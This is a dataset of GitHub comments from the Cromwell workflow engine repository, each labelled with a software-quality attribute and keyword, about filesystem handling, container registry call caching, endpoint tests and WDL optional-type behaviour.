https://github.com/broadinstitute/cromwell/pull/6816#issuecomment-1204475457:415,Integrability,depend,dependent,415,"Is this to account for things that are ""provider-dependent"" as described in the [FileSystems JavaDoc](https://docs.oracle.com/javase/8/docs/api/java/nio/file/FileSystems.html)? I'm curious exactly what behavior you saw, such as `getFileSystem` returning a reference to a closed file system or throwing `FileSystemNotFoundException`. I think it's worth having a link to any documentation that describes any provider-dependent behavior or documenting our observations ourselves. I'm also still contemplating that potential gap between `getFileSystem` and `newFileSystem`. I'd love to avoid adding our own synchronization around this, but I guess that really depends on how the blob filesystem behaves and what failure modes look like and how we want to handle them.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6816#issuecomment-1204475457
https://github.com/broadinstitute/cromwell/pull/6816#issuecomment-1204475457:603,Integrability,synchroniz,synchronization,603,"Is this to account for things that are ""provider-dependent"" as described in the [FileSystems JavaDoc](https://docs.oracle.com/javase/8/docs/api/java/nio/file/FileSystems.html)? I'm curious exactly what behavior you saw, such as `getFileSystem` returning a reference to a closed file system or throwing `FileSystemNotFoundException`. I think it's worth having a link to any documentation that describes any provider-dependent behavior or documenting our observations ourselves. I'm also still contemplating that potential gap between `getFileSystem` and `newFileSystem`. I'd love to avoid adding our own synchronization around this, but I guess that really depends on how the blob filesystem behaves and what failure modes look like and how we want to handle them.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6816#issuecomment-1204475457
https://github.com/broadinstitute/cromwell/pull/6816#issuecomment-1204475457:656,Integrability,depend,depends,656,"Is this to account for things that are ""provider-dependent"" as described in the [FileSystems JavaDoc](https://docs.oracle.com/javase/8/docs/api/java/nio/file/FileSystems.html)? I'm curious exactly what behavior you saw, such as `getFileSystem` returning a reference to a closed file system or throwing `FileSystemNotFoundException`. I think it's worth having a link to any documentation that describes any provider-dependent behavior or documenting our observations ourselves. I'm also still contemplating that potential gap between `getFileSystem` and `newFileSystem`. I'd love to avoid adding our own synchronization around this, but I guess that really depends on how the blob filesystem behaves and what failure modes look like and how we want to handle them.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6816#issuecomment-1204475457
https://github.com/broadinstitute/cromwell/pull/6816#issuecomment-1204475457:582,Safety,avoid,avoid,582,"Is this to account for things that are ""provider-dependent"" as described in the [FileSystems JavaDoc](https://docs.oracle.com/javase/8/docs/api/java/nio/file/FileSystems.html)? I'm curious exactly what behavior you saw, such as `getFileSystem` returning a reference to a closed file system or throwing `FileSystemNotFoundException`. I think it's worth having a link to any documentation that describes any provider-dependent behavior or documenting our observations ourselves. I'm also still contemplating that potential gap between `getFileSystem` and `newFileSystem`. I'd love to avoid adding our own synchronization around this, but I guess that really depends on how the blob filesystem behaves and what failure modes look like and how we want to handle them.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6816#issuecomment-1204475457
https://github.com/broadinstitute/cromwell/issues/6827#issuecomment-1218465541:147,Security,hash,hash,147,"Did some testing with the Dockstore team and concluded that ghcr.io images do technically seem to be getting pulled, but there's an issue with the hash. In the short term it might be acceptable to make the warning explain what ""not supported"" actually means, but ghcr.io seems to be increasing in popularity so it's likely best to add full official support.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6827#issuecomment-1218465541
https://github.com/broadinstitute/cromwell/issues/6827#issuecomment-1218465541:9,Testability,test,testing,9,"Did some testing with the Dockstore team and concluded that ghcr.io images do technically seem to be getting pulled, but there's an issue with the hash. In the short term it might be acceptable to make the warning explain what ""not supported"" actually means, but ghcr.io seems to be increasing in popularity so it's likely best to add full official support.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6827#issuecomment-1218465541
https://github.com/broadinstitute/cromwell/issues/6827#issuecomment-2153074225:138,Deployability,deploy,deployment,138,At Fred Hutch we're using Github container registries and guiding people who are new to WDL and Cromwell to use them. They do work on our deployment of Cromwell but I can confirm that no tasks are ever call caching hits with ghcr.io containers. https://github.com/getwilds/wilds-docker-library,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6827#issuecomment-2153074225
https://github.com/broadinstitute/cromwell/issues/6827#issuecomment-2153074225:58,Usability,guid,guiding,58,At Fred Hutch we're using Github container registries and guiding people who are new to WDL and Cromwell to use them. They do work on our deployment of Cromwell but I can confirm that no tasks are ever call caching hits with ghcr.io containers. https://github.com/getwilds/wilds-docker-library,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6827#issuecomment-2153074225
https://github.com/broadinstitute/cromwell/pull/6830#issuecomment-1421509457:82,Deployability,update,updates,82,Looks like this was partially addressed in another merge and needs merge conflict updates: https://github.com/broadinstitute/cromwell/pull/6994,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6830#issuecomment-1421509457
https://github.com/broadinstitute/cromwell/pull/6833#issuecomment-1219869823:17,Testability,test,tests,17,@kpierre13 these tests cases look great. Would it also make sense to add tests for below endpoints? Or do tests for these already exist?; - GET `/runs/{workflowId}/status`; - POST `/runs/{workflowId}/cancel`; - GET `/service-info`,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6833#issuecomment-1219869823
https://github.com/broadinstitute/cromwell/pull/6833#issuecomment-1219869823:73,Testability,test,tests,73,@kpierre13 these tests cases look great. Would it also make sense to add tests for below endpoints? Or do tests for these already exist?; - GET `/runs/{workflowId}/status`; - POST `/runs/{workflowId}/cancel`; - GET `/service-info`,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6833#issuecomment-1219869823
https://github.com/broadinstitute/cromwell/pull/6833#issuecomment-1219869823:106,Testability,test,tests,106,@kpierre13 these tests cases look great. Would it also make sense to add tests for below endpoints? Or do tests for these already exist?; - GET `/runs/{workflowId}/status`; - POST `/runs/{workflowId}/cancel`; - GET `/service-info`,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6833#issuecomment-1219869823
https://github.com/broadinstitute/cromwell/pull/6833#issuecomment-1219887096:499,Integrability,rout,routes,499,> @kpierre13 these tests cases look great. Would it also make sense to add tests for below endpoints? Or do tests for these already exist?; > ; > * GET `/runs/{workflowId}/status`; > * POST `/runs/{workflowId}/cancel`; > * GET `/service-info`. There are existing tests for the first two in the same file. The tests for `service-info` are located in [ServiceInfo.spec](https://github.com/broadinstitute/cromwell/blob/21fc23f41b776d666a089b7c83b64a066bc730e8/engine/src/test/scala/cromwell/webservice/routes/wes/ServiceInfoSpec.scala),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6833#issuecomment-1219887096
https://github.com/broadinstitute/cromwell/pull/6833#issuecomment-1219887096:19,Testability,test,tests,19,> @kpierre13 these tests cases look great. Would it also make sense to add tests for below endpoints? Or do tests for these already exist?; > ; > * GET `/runs/{workflowId}/status`; > * POST `/runs/{workflowId}/cancel`; > * GET `/service-info`. There are existing tests for the first two in the same file. The tests for `service-info` are located in [ServiceInfo.spec](https://github.com/broadinstitute/cromwell/blob/21fc23f41b776d666a089b7c83b64a066bc730e8/engine/src/test/scala/cromwell/webservice/routes/wes/ServiceInfoSpec.scala),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6833#issuecomment-1219887096
https://github.com/broadinstitute/cromwell/pull/6833#issuecomment-1219887096:75,Testability,test,tests,75,> @kpierre13 these tests cases look great. Would it also make sense to add tests for below endpoints? Or do tests for these already exist?; > ; > * GET `/runs/{workflowId}/status`; > * POST `/runs/{workflowId}/cancel`; > * GET `/service-info`. There are existing tests for the first two in the same file. The tests for `service-info` are located in [ServiceInfo.spec](https://github.com/broadinstitute/cromwell/blob/21fc23f41b776d666a089b7c83b64a066bc730e8/engine/src/test/scala/cromwell/webservice/routes/wes/ServiceInfoSpec.scala),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6833#issuecomment-1219887096
https://github.com/broadinstitute/cromwell/pull/6833#issuecomment-1219887096:108,Testability,test,tests,108,> @kpierre13 these tests cases look great. Would it also make sense to add tests for below endpoints? Or do tests for these already exist?; > ; > * GET `/runs/{workflowId}/status`; > * POST `/runs/{workflowId}/cancel`; > * GET `/service-info`. There are existing tests for the first two in the same file. The tests for `service-info` are located in [ServiceInfo.spec](https://github.com/broadinstitute/cromwell/blob/21fc23f41b776d666a089b7c83b64a066bc730e8/engine/src/test/scala/cromwell/webservice/routes/wes/ServiceInfoSpec.scala),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6833#issuecomment-1219887096
https://github.com/broadinstitute/cromwell/pull/6833#issuecomment-1219887096:263,Testability,test,tests,263,> @kpierre13 these tests cases look great. Would it also make sense to add tests for below endpoints? Or do tests for these already exist?; > ; > * GET `/runs/{workflowId}/status`; > * POST `/runs/{workflowId}/cancel`; > * GET `/service-info`. There are existing tests for the first two in the same file. The tests for `service-info` are located in [ServiceInfo.spec](https://github.com/broadinstitute/cromwell/blob/21fc23f41b776d666a089b7c83b64a066bc730e8/engine/src/test/scala/cromwell/webservice/routes/wes/ServiceInfoSpec.scala),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6833#issuecomment-1219887096
https://github.com/broadinstitute/cromwell/pull/6833#issuecomment-1219887096:309,Testability,test,tests,309,> @kpierre13 these tests cases look great. Would it also make sense to add tests for below endpoints? Or do tests for these already exist?; > ; > * GET `/runs/{workflowId}/status`; > * POST `/runs/{workflowId}/cancel`; > * GET `/service-info`. There are existing tests for the first two in the same file. The tests for `service-info` are located in [ServiceInfo.spec](https://github.com/broadinstitute/cromwell/blob/21fc23f41b776d666a089b7c83b64a066bc730e8/engine/src/test/scala/cromwell/webservice/routes/wes/ServiceInfoSpec.scala),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6833#issuecomment-1219887096
https://github.com/broadinstitute/cromwell/pull/6833#issuecomment-1219887096:468,Testability,test,test,468,> @kpierre13 these tests cases look great. Would it also make sense to add tests for below endpoints? Or do tests for these already exist?; > ; > * GET `/runs/{workflowId}/status`; > * POST `/runs/{workflowId}/cancel`; > * GET `/service-info`. There are existing tests for the first two in the same file. The tests for `service-info` are located in [ServiceInfo.spec](https://github.com/broadinstitute/cromwell/blob/21fc23f41b776d666a089b7c83b64a066bc730e8/engine/src/test/scala/cromwell/webservice/routes/wes/ServiceInfoSpec.scala),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6833#issuecomment-1219887096
https://github.com/broadinstitute/cromwell/issues/6840#issuecomment-1233394358:1964,Deployability,continuous,continuously,1964,"task (vs passing through an optional value from its caller), you could use a default value:. Although this would prevent me from using select_first() as often, in the actual workflow (which I didn't post, as it's monstrous compared to the toy example), I also have to use defined() to build the path of an optional TSV file which is either going to be in the zipped directory, or passed in directory, or not used at all. Setting an default value means I now have to check for equality with an empty string instead of using defined. In the end it'd be just as verbose and probably a little harder to debug then select_first(). > Regarding the difference in behavior of cromwell vs miniwdl, I don't think miniwdl's support for this form is backed by the WDL spec. As I see it, the spec is explicit with regard to optional parameters to Standard Library functions. For example, the signature for `size()` is `Float size(File?|Array[File?], [String])`. Since the signature for `basename()` is `String basename(String|File, [String])`, it doesn't look like it should support `String?` as an input. I'm a little confused, where are you seeing this? [sub()](https://github.com/openwdl/wdl/blob/main/versions/1.0/SPEC.md#string-substring-string-string) is titled `String sub(String, String, String)` and [size()](https://github.com/openwdl/wdl/blob/main/versions/1.0/SPEC.md#float-sizefile-string) is titled `Float size(File, [String])` in the 1.0 spec. I get that sub() [has examples with compound types](https://github.com/openwdl/wdl/blob/main/versions/1.0/SPEC.md#acceptable-compound-input-types) but I took that to mean ""here's some examples with arrays plus an optional for comparison"" since File? isn't a compound type (if I am understanding [this](https://github.com/openwdl/wdl/blob/main/versions/1.0/SPEC.md#compound-types) correctly). If size() accepts optionals in spite of the spec continuously saying `File` instead of `File?` except in one example, I don't see why basename() and sub() cannot.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6840#issuecomment-1233394358
https://github.com/broadinstitute/cromwell/issues/6840#issuecomment-1233423450:385,Deployability,integrat,integration,385,"I saw that, but since `File?` isn't a compound type, I'm under the impression that example was for comparison to the actual compound types. That's the inconsistency I'm not groking -- since `File?` isn't an example of a compound type, it seems that example's existence implies that something that accepts a `File` should also accept a `File?`, which is indeed the case with Cromwell's integration for size() but not basename() or sub(). . If we relied entirely on what the spec's headings and examples said as being the only acceptable inputs, then basename() wouldn't work on `File` at all because the spec says it actually takes in a `String`, not a `File`, and has no `File` examples. Since basename() works on `File` it seems Cromwell is already going beyond what the 1.0 spec explicitly says.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6840#issuecomment-1233423450
https://github.com/broadinstitute/cromwell/issues/6840#issuecomment-1233423450:385,Integrability,integrat,integration,385,"I saw that, but since `File?` isn't a compound type, I'm under the impression that example was for comparison to the actual compound types. That's the inconsistency I'm not groking -- since `File?` isn't an example of a compound type, it seems that example's existence implies that something that accepts a `File` should also accept a `File?`, which is indeed the case with Cromwell's integration for size() but not basename() or sub(). . If we relied entirely on what the spec's headings and examples said as being the only acceptable inputs, then basename() wouldn't work on `File` at all because the spec says it actually takes in a `String`, not a `File`, and has no `File` examples. Since basename() works on `File` it seems Cromwell is already going beyond what the 1.0 spec explicitly says.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6840#issuecomment-1233423450
https://github.com/broadinstitute/cromwell/issues/6840#issuecomment-1233430919:262,Availability,ping,ping,262,"Sorry @aofarrel we need to look into this further, but on a brief first glance I'd bet this is an oversight in the miniwdl type checker, elaborated in the [linked issue](https://github.com/chanzuckerberg/miniwdl/issues/596). thanks @pshapiro4broad for the slack ping",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6840#issuecomment-1233430919
https://github.com/broadinstitute/cromwell/issues/6840#issuecomment-1233537172:7,Safety,risk,risk,7,"At the risk of derailing this into a 1.1 thread, I have heard that WDL 1.1 adds support for directory outputs (which would completely sidestep like 50% of the issues I currently have when writing WDLs, including this one involving basename/sub/select_first) but I don't see that on the 1.1 spec -- is that a 1.1 feature or a development (1.2?) feature?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6840#issuecomment-1233537172
https://github.com/broadinstitute/cromwell/issues/6840#issuecomment-1239868895:548,Availability,error,error,548,"So I've run across into an even more explicit scenario where File? probably should be accepted (or coerced). This doesn't work:. `String? tsv_arg = if defined(tsv_file_input) then basename(tsv_file_input) else """"`. basename() is only going to be run if File? tsv_file_input is defined. Wouldn't it make sense for that if-block to effectively coerce the File? into a File in the context of the then-block? Generally speaking when I write a program that says ""if variable is defined, do something with variable"" to just work, rather than throwing an error when the variable isn't defined, much less throwing an error when the variable might not be defined (which is what appears to be happening here).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6840#issuecomment-1239868895
https://github.com/broadinstitute/cromwell/issues/6840#issuecomment-1239868895:609,Availability,error,error,609,"So I've run across into an even more explicit scenario where File? probably should be accepted (or coerced). This doesn't work:. `String? tsv_arg = if defined(tsv_file_input) then basename(tsv_file_input) else """"`. basename() is only going to be run if File? tsv_file_input is defined. Wouldn't it make sense for that if-block to effectively coerce the File? into a File in the context of the then-block? Generally speaking when I write a program that says ""if variable is defined, do something with variable"" to just work, rather than throwing an error when the variable isn't defined, much less throwing an error when the variable might not be defined (which is what appears to be happening here).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6840#issuecomment-1239868895
https://github.com/broadinstitute/cromwell/issues/6840#issuecomment-1239868895:461,Modifiability,variab,variable,461,"So I've run across into an even more explicit scenario where File? probably should be accepted (or coerced). This doesn't work:. `String? tsv_arg = if defined(tsv_file_input) then basename(tsv_file_input) else """"`. basename() is only going to be run if File? tsv_file_input is defined. Wouldn't it make sense for that if-block to effectively coerce the File? into a File in the context of the then-block? Generally speaking when I write a program that says ""if variable is defined, do something with variable"" to just work, rather than throwing an error when the variable isn't defined, much less throwing an error when the variable might not be defined (which is what appears to be happening here).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6840#issuecomment-1239868895
https://github.com/broadinstitute/cromwell/issues/6840#issuecomment-1239868895:500,Modifiability,variab,variable,500,"So I've run across into an even more explicit scenario where File? probably should be accepted (or coerced). This doesn't work:. `String? tsv_arg = if defined(tsv_file_input) then basename(tsv_file_input) else """"`. basename() is only going to be run if File? tsv_file_input is defined. Wouldn't it make sense for that if-block to effectively coerce the File? into a File in the context of the then-block? Generally speaking when I write a program that says ""if variable is defined, do something with variable"" to just work, rather than throwing an error when the variable isn't defined, much less throwing an error when the variable might not be defined (which is what appears to be happening here).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6840#issuecomment-1239868895
https://github.com/broadinstitute/cromwell/issues/6840#issuecomment-1239868895:563,Modifiability,variab,variable,563,"So I've run across into an even more explicit scenario where File? probably should be accepted (or coerced). This doesn't work:. `String? tsv_arg = if defined(tsv_file_input) then basename(tsv_file_input) else """"`. basename() is only going to be run if File? tsv_file_input is defined. Wouldn't it make sense for that if-block to effectively coerce the File? into a File in the context of the then-block? Generally speaking when I write a program that says ""if variable is defined, do something with variable"" to just work, rather than throwing an error when the variable isn't defined, much less throwing an error when the variable might not be defined (which is what appears to be happening here).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6840#issuecomment-1239868895
https://github.com/broadinstitute/cromwell/issues/6840#issuecomment-1239868895:624,Modifiability,variab,variable,624,"So I've run across into an even more explicit scenario where File? probably should be accepted (or coerced). This doesn't work:. `String? tsv_arg = if defined(tsv_file_input) then basename(tsv_file_input) else """"`. basename() is only going to be run if File? tsv_file_input is defined. Wouldn't it make sense for that if-block to effectively coerce the File? into a File in the context of the then-block? Generally speaking when I write a program that says ""if variable is defined, do something with variable"" to just work, rather than throwing an error when the variable isn't defined, much less throwing an error when the variable might not be defined (which is what appears to be happening here).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6840#issuecomment-1239868895
https://github.com/broadinstitute/cromwell/issues/6840#issuecomment-1245893354:623,Availability,error,error,623,"I'm not sure how miniwdl handles this, I'm just testing this one on Cromwell for now. But putting aside the spec, miniwdl, and Cromwell here, when I write some sort of code in any particular language, I always expect at least one of these to work:. * `if defined(variable) then do_something(variable)`; * `if type(variable) is not None then do_something(variable)` or its close cousin `if variable is not None then do_something(variable)`; * `if exists(file) then do_something(file)`. In Cromwell-flavored WDL (perhaps all WDL?), it doesn't seem you can do any of those. The first one will throw an ""Expected X but got X?"" error and the other two don't seem to have equivalents. Compare that to Python, where I can explicitly do the second or third one, and implicitly do the first one. In Python, if I try to do_something() on a variable that isn't defined, Python throws a Name Error, but in Cromwell!WDL trying to do_something() on an optional throws a ""Expected X but got X?"" error that doesn't tell you if X is actually defined or not. The fact that the WDL spec doesn't explicitly say that defined() can coerce a variable doesn't really matter -- I would wager that most people would expect this sort of thing to work. It seems to be a logical conclusion that if a file exists, you can do something to that file, without having to call a totally different function to create a new variable. I did check your workaround, but it throws the same error. So, my understanding is the only way to do this in Cromwell is this:. ```; String basename_tsv = basename(select_first([tsv_file_input, ""bogus fallback value""])); String arg_tsv = if(basename_tsv == ""bogus fallback value"") then """" else basename_tsv; ```. ...which just isn't intuitive. It shouldn't be so complicated to get the basename of an optional file. . Even less intuitive is the fact that if you separate out the select_first() part into a new variable, my workaround doesn't work anymore. ```; String maybe_tsv = select_first([tsv_file_",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6840#issuecomment-1245893354
https://github.com/broadinstitute/cromwell/issues/6840#issuecomment-1245893354:880,Availability,Error,Error,880,"I'm not sure how miniwdl handles this, I'm just testing this one on Cromwell for now. But putting aside the spec, miniwdl, and Cromwell here, when I write some sort of code in any particular language, I always expect at least one of these to work:. * `if defined(variable) then do_something(variable)`; * `if type(variable) is not None then do_something(variable)` or its close cousin `if variable is not None then do_something(variable)`; * `if exists(file) then do_something(file)`. In Cromwell-flavored WDL (perhaps all WDL?), it doesn't seem you can do any of those. The first one will throw an ""Expected X but got X?"" error and the other two don't seem to have equivalents. Compare that to Python, where I can explicitly do the second or third one, and implicitly do the first one. In Python, if I try to do_something() on a variable that isn't defined, Python throws a Name Error, but in Cromwell!WDL trying to do_something() on an optional throws a ""Expected X but got X?"" error that doesn't tell you if X is actually defined or not. The fact that the WDL spec doesn't explicitly say that defined() can coerce a variable doesn't really matter -- I would wager that most people would expect this sort of thing to work. It seems to be a logical conclusion that if a file exists, you can do something to that file, without having to call a totally different function to create a new variable. I did check your workaround, but it throws the same error. So, my understanding is the only way to do this in Cromwell is this:. ```; String basename_tsv = basename(select_first([tsv_file_input, ""bogus fallback value""])); String arg_tsv = if(basename_tsv == ""bogus fallback value"") then """" else basename_tsv; ```. ...which just isn't intuitive. It shouldn't be so complicated to get the basename of an optional file. . Even less intuitive is the fact that if you separate out the select_first() part into a new variable, my workaround doesn't work anymore. ```; String maybe_tsv = select_first([tsv_file_",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6840#issuecomment-1245893354
https://github.com/broadinstitute/cromwell/issues/6840#issuecomment-1245893354:980,Availability,error,error,980,"I'm not sure how miniwdl handles this, I'm just testing this one on Cromwell for now. But putting aside the spec, miniwdl, and Cromwell here, when I write some sort of code in any particular language, I always expect at least one of these to work:. * `if defined(variable) then do_something(variable)`; * `if type(variable) is not None then do_something(variable)` or its close cousin `if variable is not None then do_something(variable)`; * `if exists(file) then do_something(file)`. In Cromwell-flavored WDL (perhaps all WDL?), it doesn't seem you can do any of those. The first one will throw an ""Expected X but got X?"" error and the other two don't seem to have equivalents. Compare that to Python, where I can explicitly do the second or third one, and implicitly do the first one. In Python, if I try to do_something() on a variable that isn't defined, Python throws a Name Error, but in Cromwell!WDL trying to do_something() on an optional throws a ""Expected X but got X?"" error that doesn't tell you if X is actually defined or not. The fact that the WDL spec doesn't explicitly say that defined() can coerce a variable doesn't really matter -- I would wager that most people would expect this sort of thing to work. It seems to be a logical conclusion that if a file exists, you can do something to that file, without having to call a totally different function to create a new variable. I did check your workaround, but it throws the same error. So, my understanding is the only way to do this in Cromwell is this:. ```; String basename_tsv = basename(select_first([tsv_file_input, ""bogus fallback value""])); String arg_tsv = if(basename_tsv == ""bogus fallback value"") then """" else basename_tsv; ```. ...which just isn't intuitive. It shouldn't be so complicated to get the basename of an optional file. . Even less intuitive is the fact that if you separate out the select_first() part into a new variable, my workaround doesn't work anymore. ```; String maybe_tsv = select_first([tsv_file_",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6840#issuecomment-1245893354
https://github.com/broadinstitute/cromwell/issues/6840#issuecomment-1245893354:1449,Availability,error,error,1449,"ng(variable)`; * `if exists(file) then do_something(file)`. In Cromwell-flavored WDL (perhaps all WDL?), it doesn't seem you can do any of those. The first one will throw an ""Expected X but got X?"" error and the other two don't seem to have equivalents. Compare that to Python, where I can explicitly do the second or third one, and implicitly do the first one. In Python, if I try to do_something() on a variable that isn't defined, Python throws a Name Error, but in Cromwell!WDL trying to do_something() on an optional throws a ""Expected X but got X?"" error that doesn't tell you if X is actually defined or not. The fact that the WDL spec doesn't explicitly say that defined() can coerce a variable doesn't really matter -- I would wager that most people would expect this sort of thing to work. It seems to be a logical conclusion that if a file exists, you can do something to that file, without having to call a totally different function to create a new variable. I did check your workaround, but it throws the same error. So, my understanding is the only way to do this in Cromwell is this:. ```; String basename_tsv = basename(select_first([tsv_file_input, ""bogus fallback value""])); String arg_tsv = if(basename_tsv == ""bogus fallback value"") then """" else basename_tsv; ```. ...which just isn't intuitive. It shouldn't be so complicated to get the basename of an optional file. . Even less intuitive is the fact that if you separate out the select_first() part into a new variable, my workaround doesn't work anymore. ```; String maybe_tsv = select_first([tsv_file_input, ""bogus fallback value""]); String basename_tsv = basename(maybe_tsv); String arg_tsv = if(basename_tsv == ""bogus fallback value"") then """" else basename_tsv; ```. _Failed to process task definition 'parse_terratable' (reason 1 of 1): Failed to process expression 'select_first([basename_tsv, basename(maybe_tsv)])' (reason 1 of 1): Invalid parameter 'IdentifierLookup(maybe_tsv)'. Expected 'File' but got 'String?'_. In ",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6840#issuecomment-1245893354
https://github.com/broadinstitute/cromwell/issues/6840#issuecomment-1245893354:263,Modifiability,variab,variable,263,"I'm not sure how miniwdl handles this, I'm just testing this one on Cromwell for now. But putting aside the spec, miniwdl, and Cromwell here, when I write some sort of code in any particular language, I always expect at least one of these to work:. * `if defined(variable) then do_something(variable)`; * `if type(variable) is not None then do_something(variable)` or its close cousin `if variable is not None then do_something(variable)`; * `if exists(file) then do_something(file)`. In Cromwell-flavored WDL (perhaps all WDL?), it doesn't seem you can do any of those. The first one will throw an ""Expected X but got X?"" error and the other two don't seem to have equivalents. Compare that to Python, where I can explicitly do the second or third one, and implicitly do the first one. In Python, if I try to do_something() on a variable that isn't defined, Python throws a Name Error, but in Cromwell!WDL trying to do_something() on an optional throws a ""Expected X but got X?"" error that doesn't tell you if X is actually defined or not. The fact that the WDL spec doesn't explicitly say that defined() can coerce a variable doesn't really matter -- I would wager that most people would expect this sort of thing to work. It seems to be a logical conclusion that if a file exists, you can do something to that file, without having to call a totally different function to create a new variable. I did check your workaround, but it throws the same error. So, my understanding is the only way to do this in Cromwell is this:. ```; String basename_tsv = basename(select_first([tsv_file_input, ""bogus fallback value""])); String arg_tsv = if(basename_tsv == ""bogus fallback value"") then """" else basename_tsv; ```. ...which just isn't intuitive. It shouldn't be so complicated to get the basename of an optional file. . Even less intuitive is the fact that if you separate out the select_first() part into a new variable, my workaround doesn't work anymore. ```; String maybe_tsv = select_first([tsv_file_",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6840#issuecomment-1245893354
https://github.com/broadinstitute/cromwell/issues/6840#issuecomment-1245893354:291,Modifiability,variab,variable,291,"I'm not sure how miniwdl handles this, I'm just testing this one on Cromwell for now. But putting aside the spec, miniwdl, and Cromwell here, when I write some sort of code in any particular language, I always expect at least one of these to work:. * `if defined(variable) then do_something(variable)`; * `if type(variable) is not None then do_something(variable)` or its close cousin `if variable is not None then do_something(variable)`; * `if exists(file) then do_something(file)`. In Cromwell-flavored WDL (perhaps all WDL?), it doesn't seem you can do any of those. The first one will throw an ""Expected X but got X?"" error and the other two don't seem to have equivalents. Compare that to Python, where I can explicitly do the second or third one, and implicitly do the first one. In Python, if I try to do_something() on a variable that isn't defined, Python throws a Name Error, but in Cromwell!WDL trying to do_something() on an optional throws a ""Expected X but got X?"" error that doesn't tell you if X is actually defined or not. The fact that the WDL spec doesn't explicitly say that defined() can coerce a variable doesn't really matter -- I would wager that most people would expect this sort of thing to work. It seems to be a logical conclusion that if a file exists, you can do something to that file, without having to call a totally different function to create a new variable. I did check your workaround, but it throws the same error. So, my understanding is the only way to do this in Cromwell is this:. ```; String basename_tsv = basename(select_first([tsv_file_input, ""bogus fallback value""])); String arg_tsv = if(basename_tsv == ""bogus fallback value"") then """" else basename_tsv; ```. ...which just isn't intuitive. It shouldn't be so complicated to get 